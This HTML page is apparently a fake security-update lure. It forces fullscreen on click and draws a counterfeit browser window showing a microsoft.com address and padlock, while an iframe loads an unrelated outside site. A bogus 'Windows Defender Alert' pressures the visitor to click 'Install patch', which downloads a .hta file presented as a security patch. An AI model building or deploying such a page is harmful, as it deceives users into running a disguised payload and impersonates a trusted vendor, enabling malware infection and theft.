<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script>
		function fs(){
			var elem = document.documentElement; // This selects the <html> element
			// Request full screen
			if (elem.requestFullscreen) {
			elem.requestFullscreen();
			} else if (elem.webkitRequestFullscreen) { /* Safari */
			elem.webkitRequestFullscreen();
			} else if (elem.msRequestFullscreen) { /* IE11 */
			elem.msRequestFullscreen();
			}
		}	
	</script>
</head>
<body onclick="fs();">

	<div class="bottom-div">
		<div class="header-container">		  
		  <div class="header-text-container">
			<h2>
			  <img class="img2"src="win.png" alt="image description">
			  Windows Defender Alert
			</h2>
			<p>Your system detected some unusual activity.</p>
			<p>It might harm your computer data and track your financial activities.</p>
			<p><strong>You need install security patch KB-CVE-2023-0941 immediately.</strong></p>
		  </div>
		  <a href="KB-CVE-2023-0941.hta" class="myButton">Install patch</a>
		</div>
	  </div>

<div class="center">
	<div id="window">
	<!-- Title bar start -->
	<div id="title-bar-width">
		<div id="title-bar">
			<div style="margin-top:5px;">
				<img src="./logo.svg" width="20px" height="15px" id="logo">
				<span id="logo-description">Microsoft</span>
			</div>
			
			<div>
				<span id="minimize">&#8212;</span>
				<span id="square">□</span>
				<span id="exit">✕</span>
			</div>
		</div>
		<div id="url-bar">
			<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
			<span id="domain-name"></span>
			<span id="domain-path">https://www.microsoft.com/</span>
		</div>
	</div>
	<!-- Content start -->
	<iframe id="content" src="https://truegame.us/index.php" frameBorder="0"></iframe>
	</div>
</div>

</body>
<script src="script.js"></script>
</html>
